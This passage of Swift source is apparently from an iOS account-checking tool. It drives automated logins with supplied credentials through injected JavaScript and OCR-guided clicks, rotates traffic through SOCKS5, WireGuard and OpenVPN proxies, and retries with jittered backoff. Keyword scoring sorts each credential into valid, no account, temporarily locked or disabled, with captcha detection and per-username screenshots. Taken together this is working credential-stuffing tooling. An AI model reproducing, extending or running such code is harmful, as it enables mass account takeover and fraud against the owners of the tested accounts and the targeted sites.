            "temporarily disabled", "temporarily suspended",
            "temporarily blocked", "too many attempts",
            "too many login attempts", "too many failed",
            "try again later", "try again in", "account temporarily",
            "locked for", "wait before", "exceeded login attempts",
            "multiple failed attempts", "login attempts exceeded",
        ]
        for term in tempLockTerms {
            if contentLower.contains(term) {
                temporarilyLocked = true
                disabledScore += 40
                disabledSignals.append("+40 TEMP_LOCK '\(term)'")
                break
            }
        }

        let strongDisabledTerms: [(String, Int)] = [
            ("account has been disabled", 200), ("account has been suspended", 60),
            ("account has been blocked", 60), ("account has been deactivated", 60),
            ("your account has been disabled", 200), ("your account is disabled", 200),
            ("account is disabled", 200),
            ("has been disabled", 55), ("has been suspended", 55),
            ("has been blocked", 55), ("has been deactivated", 55),
            ("your account is locked", 55), ("account is restricted", 50),
            ("permanently banned", 60), ("permanently disabled", 60),
            ("blacklisted", 50), ("contact customer service", 30), ("contact support", 15),
            ("account is closed", 55), ("self-excluded", 40),
            ("please, contact customer", 35), ("contact customer", 25),
        ]
        for (term, weight) in strongDisabledTerms {
            if contentLower.contains(term) {
                disabledScore += weight
                disabledSignals.append("+\(weight) '\(term)'")
            }
        }

        let weakDisabledTerms: [(String, Int)] = [
            ("disabled", 12), ("suspended", 15), ("blocked", 12),
            ("banned", 15), ("locked", 12), ("restricted", 10),
            ("deactivated", 15),
        ]
        for (term, weight) in weakDisabledTerms {
            if contentLower.contains(term) {
                disabledScore += weight
                disabledSignals.append("+\(weight) '\(term)'")
            }
        }

        // --- FALSE POSITIVE guards ---

        if contentLower.contains("captcha") || contentLower.contains("verify you are human") ||
           contentLower.contains("cloudflare") || contentLower.contains("challenge-platform") {
            successScore = 0
            successSignals.append("-ALL CAPTCHA/challenge detected, zeroed success")
        }

        // --- DECISION: STRICT FAIL-BY-DEFAULT ---
        // Success ONLY if Welcome! text was captured OR page redirected to homepage
        // Everything else is a fail unless explicitly matching incorrect/disabled patterns

        let successThreshold = 60
        let incorrectThreshold = 20
        let disabledThreshold = 30

        if disabledScore >= disabledThreshold && disabledScore > incorrectScore {
            let topSignals = disabledSignals.prefix(3).joined(separator: ", ")
            if temporarilyLocked {
                return EvaluationResult(
                    outcome: .tempDisabled,
                    score: disabledScore,
                    reason: "Temporarily disabled [\(topSignals)]",
                    signals: disabledSignals
                )
            } else {
                return EvaluationResult(
                    outcome: .permDisabled,
                    score: disabledScore,
                    reason: "Permanently disabled [\(topSignals)]",
                    signals: disabledSignals
                )
            }
        }

        if successScore >= successThreshold && successScore > incorrectScore && successScore > disabledScore {
            let topSignals = successSignals.prefix(3).joined(separator: ", ")
            let hasRealMarker = trueDetectionSuccessMarkers.contains { contentLower.contains($0) }
            let reason = hasRealMarker ? "TRUE DETECTION SUCCESS MARKER CONFIRMED" : (redirectedToHomepage ? "HOMEPAGE REDIRECT CONFIRMED" : "SUCCESS SIGNALS DETECTED")
            return EvaluationResult(
                outcome: .success,
                score: successScore,
                reason: "\(reason) [\(topSignals)]",
                signals: successSignals
            )
        }

        let strongIncorrectThreshold = 30
        if incorrectScore >= strongIncorrectThreshold && incorrectScore > successScore {
            let topSignals = incorrectSignals.prefix(3).joined(separator: ", ")
            return EvaluationResult(
                outcome: .noAcc,
                score: incorrectScore,
                reason: "No account / invalid credentials [\(topSignals)]",
                signals: incorrectSignals
            )
        }

        if incorrectScore >= incorrectThreshold && incorrectScore > successScore && contentChanged {
            let topSignals = incorrectSignals.prefix(3).joined(separator: ", ")
            return EvaluationResult(
                outcome: .noAcc,
                score: incorrectScore,
                reason: "No account / weak signals but content changed [\(topSignals)]",
                signals: incorrectSignals
            )
        }

        let maxScore = max(successScore, max(incorrectScore, disabledScore))
        let allSignals = successSignals + incorrectSignals + disabledSignals
        let snippet = String(pageContent.prefix(150)).replacingOccurrences(of: "\n", with: " ")
        return EvaluationResult(
            outcome: .unsure,
            score: maxScore,
            reason: "Ambiguous — requeuing (success:\(successScore) incorrect:\(incorrectScore) disabled:\(disabledScore)) content: \"\(snippet)\"",
            signals: allSignals
        )
    }

    // MARK: - Helpers

    private func retryFill(
        session: LoginSiteWebSession,
        attempt: LoginAttempt,
        fieldName: String,
        sessionId: String = "",
        fill: () async -> (success: Bool, detail: String)
    ) async -> Bool {
        for attemptNum in 1...3 {
            logger.startTimer(key: "\(sessionId)_retryfill_\(fieldName)_\(attemptNum)")
            let result = await fill()
            let ms = logger.stopTimer(key: "\(sessionId)_retryfill_\(fieldName)_\(attemptNum)")
            if result.success {
                attempt.logs.append(PPSRLogEntry(message: "\(fieldName): \(result.detail)", level: .success))
                logger.log("\(fieldName) fill attempt \(attemptNum): \(result.detail)", category: .automation, level: .trace, sessionId: sessionId, durationMs: ms)
                return true
            }
            attempt.logs.append(PPSRLogEntry(message: "\(fieldName) attempt \(attemptNum)/3 FAILED: \(result.detail)", level: .warning))
            logger.log("\(fieldName) fill attempt \(attemptNum)/3 FAILED: \(result.detail)", category: .automation, level: .warning, sessionId: sessionId, durationMs: ms)
            if attemptNum < 3 {
                let baseMs = 500 * (1 << (attemptNum - 1))
                let jitter = Int.random(in: 0...Int(Double(baseMs) * 0.3))
                let delayMs = baseMs + jitter
                attempt.logs.append(PPSRLogEntry(message: "\(fieldName): backoff \(delayMs)ms before retry \(attemptNum + 1)", level: .info))
                try? await Task.sleep(for: .milliseconds(delayMs))
            }
        }
        failAttempt(attempt, message: "\(fieldName) FILL FAILED after 3 attempts")
        return false
    }

    private func advanceTo(_ status: LoginAttemptStatus, attempt: LoginAttempt, message: String) {
        attempt.status = status
        attempt.logs.append(PPSRLogEntry(message: message, level: status == .completed ? .success : .info))
    }

    private func failAttempt(_ attempt: LoginAttempt, message: String) {
        attempt.status = .failed
        attempt.errorMessage = message
        attempt.completedAt = Date()
        attempt.logs.append(PPSRLogEntry(message: "ERROR: \(message)", level: .error))
    }

    private func captureAlwaysScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, cycle: Int, maxCycles: Int, welcomeTextFound: Bool, redirected: Bool, evaluationReason: String, currentURL: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult) async {
        logger.log("Capturing screenshot cycle \(cycle)/\(maxCycles) autoResult=\(autoResult)", category: .screenshot, level: .trace)
        guard let img = await session.captureScreenshot() else {
            logger.log("Screenshot capture FAILED (nil)", category: .screenshot, level: .warning)
            return
        }
        attempt.responseSnapshot = img

        var finalAutoResult = autoResult
        let ocrDisabledCheck = await visionML.detectDisabledAccount(in: img)
        if ocrDisabledCheck.type != .none {
            logger.log("OCR DISABLED DETECTION on screenshot: \(ocrDisabledCheck.type.rawValue) — '\(ocrDisabledCheck.matchedText ?? "unknown")'" , category: .evaluation, level: .critical)
            if ocrDisabledCheck.type == .smsDetected {
                finalAutoResult = .unknown
            } else {
                finalAutoResult = .fail
            }
        }

        let compressed: UIImage
        if let jpegData = img.jpegData(compressionQuality: 0.4), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = img
        }

        var noteExtra = ""
        if ocrDisabledCheck.type != .none {
            noteExtra = " | OCR_DISABLED: \(ocrDisabledCheck.type.rawValue) '\(ocrDisabledCheck.matchedText ?? "")'"
        }

        let screenshot = PPSRDebugScreenshot(
            stepName: "post_login_cycle_\(cycle)",
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: "Cycle \(cycle)/\(maxCycles) | Welcome!: \(welcomeTextFound ? "YES" : "NO") | Redirect: \(redirected ? "YES" : "NO") | \(evaluationReason) | URL: \(currentURL)\(noteExtra)",
            autoDetectedResult: finalAutoResult
        )
        attempt.screenshotIds.append(screenshot.id)
        onScreenshot?(screenshot)
    }

    private func visionCalibrateSession(session: LoginSiteWebSession, forURL url: String, sessionId: String) async -> LoginCalibrationService.URLCalibration? {
        guard let screenshot = await session.captureScreenshot() else {
            logger.log("Vision calibration: no screenshot available", category: .automation, level: .error, sessionId: sessionId)
            return nil
        }

        let viewportSize = session.getViewportSize()
        let detection = await visionML.detectLoginElements(in: screenshot, viewportSize: viewportSize)

        guard detection.confidence > 0.3 else {
            logger.log("Vision calibration: confidence too low (\(String(format: "%.0f%%", detection.confidence * 100)))", category: .automation, level: .warning, sessionId: sessionId)
            return nil
        }

        let cal = visionML.buildVisionCalibration(from: detection, forURL: url)
        logger.log("Vision calibration: built calibration for \(url) — email:\(cal.emailField != nil) pass:\(cal.passwordField != nil) btn:\(cal.loginButton != nil)", category: .automation, level: .success, sessionId: sessionId)
        return cal
    }

    private func visionClickLoginButton(session: LoginSiteWebSession, sessionId: String) async -> Bool {
        guard let screenshot = await session.captureScreenshot() else { return false }

        let viewportSize = session.getViewportSize()

        for searchTerm in ["Log In", "Login", "Sign In", "Submit", "Enter"] {
            let hit = await visionML.findTextOnScreen(searchTerm, in: screenshot, viewportSize: viewportSize)
            if let hit {
                let js = """
                (function(){
                    var el = document.elementFromPoint(\(Int(hit.pixelCoordinate.x)), \(Int(hit.pixelCoordinate.y)));
                    if (!el) return 'NO_ELEMENT';
                    try {
                        el.focus();
                        el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y)),pointerId:1,pointerType:'touch'}));
                        el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y)),pointerId:1,pointerType:'touch'}));
                        el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:\(Int(hit.pixelCoordinate.x)),clientY:\(Int(hit.pixelCoordinate.y))}));
                        if (typeof el.click === 'function') el.click();
                        if (el.tagName === 'BUTTON' || el.type === 'submit') {
                            var form = el.closest('form');
                            if (form) form.requestSubmit ? form.requestSubmit() : form.submit();
                        }
                        return 'VISION_CLICKED:' + el.tagName;
                    } catch(e) { return 'ERROR:' + e.message; }
                })()
                """
                let result = await session.executeJS(js)
                if let result, result.hasPrefix("VISION_CLICKED") {
                    logger.log("Vision click login button: found '\(searchTerm)' at (\(Int(hit.pixelCoordinate.x)),\(Int(hit.pixelCoordinate.y))) — \(result)", category: .automation, level: .success, sessionId: sessionId)
                    return true
                }
            }
        }

        let detection = await visionML.detectLoginElements(in: screenshot, viewportSize: viewportSize)
        if let btnHit = detection.loginButton {
            let js = """
            (function(){
                var el = document.elementFromPoint(\(Int(btnHit.pixelCoordinate.x)), \(Int(btnHit.pixelCoordinate.y)));
                if (!el) return 'NO_ELEMENT';
                el.focus();
                el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:\(Int(btnHit.pixelCoordinate.x)),clientY:\(Int(btnHit.pixelCoordinate.y))}));
                if (typeof el.click === 'function') el.click();
                return 'VISION_CLICKED:' + el.tagName;
            })()
            """
            let result = await session.executeJS(js)
            if let result, result.hasPrefix("VISION_CLICKED") {
                logger.log("Vision click login button (detection): '\(btnHit.label)' — \(result)", category: .automation, level: .success, sessionId: sessionId)
                return true
            }
        }

        logger.log("Vision click login button: no button found via OCR", category: .automation, level: .warning, sessionId: sessionId)
        return false
    }

    private func waitForPageReadyByColour(session: LoginSiteWebSession, sessionId: String) async -> (settled: Bool, durationMs: Int, detail: String) {
        let start = Date()
        let maxWaitMs = 15000
        var lastBgColor = ""
        var lastOpacity = -1.0
        var stableCount = 0
        let requiredStableChecks = 3

        let colourCheckJS = """
        (function() {
            var loginTerms = ['log in','login','sign in','signin'];
            var btns = document.querySelectorAll('button, input[type="submit"], a.btn, [role="button"], #login-submit');
            var btn = document.querySelector('#login-submit');
            if (!btn) {
                for (var i = 0; i < btns.length; i++) {
                    var text = (btns[i].textContent || btns[i].value || '').replace(/[\\s]+/g,' ').toLowerCase().trim();
                    if (text.length > 50) continue;
                    for (var t = 0; t < loginTerms.length; t++) {
                        if (text === loginTerms[t] || (text.indexOf(loginTerms[t]) !== -1 && text.length < 25)) { btn = btns[i]; break; }
                    }
                    if (btn) break;
                }
            }
            if (!btn) btn = document.querySelector('button[type="submit"]') || document.querySelector('input[type="submit"]');
            if (!btn) return JSON.stringify({found: false});
            var style = window.getComputedStyle(btn);
            var bodyStyle = window.getComputedStyle(document.body);
            var spinners = document.querySelectorAll('.spinner, .loading, [class*="spinner"], [class*="loading"], [class*="loader"]');
            var hasSpinner = false;
            for (var s = 0; s < spinners.length; s++) {
                if (spinners[s].offsetParent !== null) { hasSpinner = true; break; }
            }
            var overlays = document.querySelectorAll('.overlay, .modal-backdrop, [class*="overlay"]');
            var hasOverlay = false;
            for (var o = 0; o < overlays.length; o++) {
                if (overlays[o].offsetParent !== null && window.getComputedStyle(overlays[o]).opacity !== '0') { hasOverlay = true; break; }
            }
            return JSON.stringify({
                found: true,
                bgColor: style.backgroundColor,
                opacity: parseFloat(style.opacity),
                disabled: btn.disabled || false,
                pointerEvents: style.pointerEvents,
                cursor: style.cursor,
                bodyBg: bodyStyle.backgroundColor,
                hasSpinner: hasSpinner,
                hasOverlay: hasOverlay,
                readyState: document.readyState
            });
        })();
        """

        while true {
            let elapsedMs = Int(Date().timeIntervalSince(start) * 1000)
            if elapsedMs >= maxWaitMs {
                logger.log("ColourReadiness: TIMEOUT after \(elapsedMs)ms — proceeding", category: .automation, level: .warning, sessionId: sessionId)
                return (false, elapsedMs, "Timeout after \(elapsedMs)ms — page may not be fully settled")
            }

            guard let raw = await session.executeJS(colourCheckJS),
                  let data = raw.data(using: .utf8),
                  let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let found = json["found"] as? Bool, found else {
                try? await Task.sleep(for: .milliseconds(500))
                continue
            }

            let bgColor = json["bgColor"] as? String ?? ""
            let opacity = json["opacity"] as? Double ?? 1.0
            let disabled = json["disabled"] as? Bool ?? false
            let pointerEvents = json["pointerEvents"] as? String ?? "auto"
            let cursor = json["cursor"] as? String ?? ""
            let hasSpinner = json["hasSpinner"] as? Bool ?? false
            let hasOverlay = json["hasOverlay"] as? Bool ?? false
            let readyState = json["readyState"] as? String ?? ""

            if hasSpinner || hasOverlay || readyState != "complete" || disabled || pointerEvents == "none" || cursor == "wait" || cursor == "progress" || opacity < 0.7 {
                stableCount = 0
                lastBgColor = bgColor
                lastOpacity = opacity
                try? await Task.sleep(for: .milliseconds(400))
                continue
            }

            if bgColor == lastBgColor && abs(opacity - lastOpacity) < 0.05 {
                stableCount += 1
            } else {
                stableCount = 1
            }
            lastBgColor = bgColor
            lastOpacity = opacity

            if stableCount >= requiredStableChecks {
                let finalMs = Int(Date().timeIntervalSince(start) * 1000)
                logger.log("ColourReadiness: page SETTLED in \(finalMs)ms — button bg=\(bgColor) opacity=\(String(format: "%.2f", opacity))", category: .automation, level: .success, sessionId: sessionId)
                return (true, finalMs, "Button colour stable (bg=\(bgColor) opacity=\(String(format: "%.2f", opacity))) after \(stableCount) consecutive checks")
            }

            try? await Task.sleep(for: .milliseconds(400))
        }
    }

    private func visionVerifyPostLogin(session: LoginSiteWebSession, sessionId: String) async -> (welcomeFound: Bool, errorFound: Bool, context: String?) {
        guard let screenshot = await session.captureScreenshot() else {
            return (false, false, nil)
        }
        return await visionML.detectSuccessIndicators(in: screenshot)
    }

    private func captureTerminalScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, step: String, note: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult, terminalType: TrueDetectionService.TerminalError) async {
        let config = TrueDetectionService.TrueDetectionConfig()

        let terminalImage: UIImage?
        if terminalType == .errorBanner {
            terminalImage = await trueDetection.captureErrorBannerCrop(session: session, config: config)
        } else {
            terminalImage = await captureTerminalMessageCrop(session: session, terminalType: terminalType)
        }

        var finalImage = terminalImage
        if finalImage == nil {
            finalImage = await session.captureScreenshot()
        }
        guard let finalImage else { return }

        let compressed: UIImage
        if let jpegData = finalImage.jpegData(compressionQuality: 0.5), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = finalImage
        }

        let previousIds = attempt.screenshotIds
        if !previousIds.isEmpty {
            onPurgeScreenshots?(previousIds)
            attempt.screenshotIds.removeAll()
        }

        attempt.responseSnapshot = compressed

        let screenshot = PPSRDebugScreenshot(
            stepName: step,
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: note,
            autoDetectedResult: autoResult
        )
        attempt.screenshotIds = [screenshot.id]
        onScreenshot?(screenshot)

        logger.log("Terminal screenshot captured for \(step) — purged \(previousIds.count) previous screenshot(s)", category: .screenshot, level: .info)
    }

    private func captureTerminalMessageCrop(session: LoginSiteWebSession, terminalType: TrueDetectionService.TerminalError) async -> UIImage? {
        guard let fullScreenshot = await session.captureScreenshot() else { return nil }
        guard let webView = session.webView else { return fullScreenshot }

        let keywords: [String]
        switch terminalType {
        case .temporarilyDisabled:
            keywords = ["temporarily", "temporarily disabled", "temporarily locked", "temporarily suspended", "too many attempts", "try again later"]
        case .accountDisabled:
            keywords = ["account is disabled", "account has been disabled", "account has been suspended", "permanently banned", "account is closed", "self-excluded", "account has been blocked"]
        case .errorBanner:
            return fullScreenshot
        case .smsVerification:
            keywords = ["sms", "text message", "verification code", "verify your phone", "send code", "enter the code", "phone verification", "mobile verification", "code sent", "enter code", "security code"]
        }

        let keywordsJS = "[" + keywords.map { "'\($0)'" }.joined(separator: ",") + "]"

        let searchJS = """
        (function() {
            var keywords = \(keywordsJS);
            var allElements = document.querySelectorAll('div, p, span, h1, h2, h3, h4, h5, h6, li, td, section, article, aside, label, strong, em, b');
            for (var i = 0; i < allElements.length; i++) {
                var el = allElements[i];
                var text = (el.textContent || '').toLowerCase();
                var visible = el.offsetParent !== null || el.offsetHeight > 0;
                if (!visible) continue;
                for (var k = 0; k < keywords.length; k++) {
                    if (text.indexOf(keywords[k]) !== -1) {
                        var rect = el.getBoundingClientRect();
                        if (rect.width > 20 && rect.height > 10) {
                            return JSON.stringify({x: rect.left, y: rect.top, w: rect.width, h: rect.height});
                        }
                    }
                }
            }
            return null;
        })();
        """

        if let result = await session.executeJS(searchJS),
           let data = result.data(using: .utf8),
           let json = try? JSONSerialization.jsonObject(with: data) as? [String: Double],
           let x = json["x"], let y = json["y"], let w = json["w"], let h = json["h"],
           w > 20, h > 10 {

            let viewSize = webView.bounds.size
            guard let cgImage = fullScreenshot.cgImage else { return fullScreenshot }
            let imageW = CGFloat(cgImage.width)
            let imageH = CGFloat(cgImage.height)
            let scaleX = imageW / viewSize.width
            let scaleY = imageH / viewSize.height

            let padding: CGFloat = 20
            let cropRect = CGRect(
                x: max(0, x * scaleX - padding),
                y: max(0, y * scaleY - padding),
                width: min(imageW, w * scaleX + padding * 2),
                height: min(imageH, h * scaleY + padding * 2)
            )

            if let croppedCG = cgImage.cropping(to: cropRect) {
                return UIImage(cgImage: croppedCG, scale: fullScreenshot.scale, orientation: fullScreenshot.imageOrientation)
            }
        }

        return fullScreenshot
    }

    private func captureDebugScreenshot(session: LoginSiteWebSession, attempt: LoginAttempt, step: String, note: String, autoResult: PPSRDebugScreenshot.AutoDetectedResult = .unknown) async {
        guard let fullImage = await session.captureScreenshot() else { return }

        attempt.responseSnapshot = fullImage

        let compressed: UIImage
        if let jpegData = fullImage.jpegData(compressionQuality: 0.4), let ci = UIImage(data: jpegData) {
            compressed = ci
        } else {
            compressed = fullImage
        }

        let screenshot = PPSRDebugScreenshot(
            stepName: step,
            cardDisplayNumber: attempt.credential.username,
            cardId: attempt.credential.id,
            vin: "",
            email: attempt.credential.username,
            image: compressed,
            note: note,
            autoDetectedResult: autoResult
        )
        attempt.screenshotIds.append(screenshot.id)
        onScreenshot?(screenshot)
    }

    private func checkInteractiveElementsExist(session: LoginSiteWebSession, sessionId: String) async -> (hasElements: Bool, detail: String) {
        let js = """
        (function(){
            var inputs = document.querySelectorAll('input:not([type="hidden"]), select, textarea, button[type="submit"], button:not([disabled])');
            var visible = 0;
            for (var i = 0; i < inputs.length; i++) {
                var el = inputs[i];
                if (el.offsetParent !== null || el.offsetHeight > 0 || el.offsetWidth > 0) visible++;
            }
            return 'INTERACTIVE:' + visible + '/' + inputs.length;
        })()
        """
        if let result = await session.executeJS(js), result.hasPrefix("INTERACTIVE:") {
            let parts = result.replacingOccurrences(of: "INTERACTIVE:", with: "").split(separator: "/")
            let visible = Int(parts.first ?? "0") ?? 0
            let total = Int(parts.last ?? "0") ?? 0
            logger.log("Interactive elements: \(visible) visible / \(total) total", category: .automation, level: visible > 0 ? .debug : .warning, sessionId: sessionId)
            return (visible > 0, "\(visible) visible / \(total) total")
        }
        return (false, "JS eval failed or webView nil")
    }

    private func extractProxyId(from config: ActiveNetworkConfig) -> String? {
        switch config {
        case .socks5(let proxy): return proxy.id.uuidString
        case .wireGuardDNS(let wg): return wg.uniqueKey
        case .openVPNProxy(let ovpn): return ovpn.uniqueKey
        case .direct: return nil
        }
    }

    private func makeSlowDebugCaptureTaskIfNeeded(session: LoginSiteWebSession, attempt: LoginAttempt, sessionId: String) -> Task<Void, Never>? {
        guard automationSettings.slowDebugMode else { return nil }
        screenshotDedup.resetSession()
        return Task { [weak self] in
            guard let self else { return }
            var captureIndex = 1
            while !Task.isCancelled {
                do {
                    try await Task.sleep(for: .seconds(2))
                } catch {
                    return
                }
                guard !Task.isCancelled else { return }
                guard !attempt.status.isTerminal else { return }

                if let img = await session.captureScreenshotFast(), self.screenshotDedup.isDuplicate(img) {
                    self.logger.log("Slow debug capture \(captureIndex) SKIPPED (duplicate)", category: .screenshot, level: .trace, sessionId: sessionId)
                    captureIndex += 1
                    continue
                }

                logger.log("Slow debug capture \(captureIndex) status=\(attempt.status.rawValue)", category: .screenshot, level: .trace, sessionId: sessionId)
                await self.captureDebugScreenshot(
                    session: session,
                    attempt: attempt,
                    step: "slow_debug_\(captureIndex)",
                    note: "Slow debug capture \(captureIndex) | status: \(attempt.status.rawValue)",
                    autoResult: .unknown
                )
                captureIndex += 1
            }
        }
    }
}
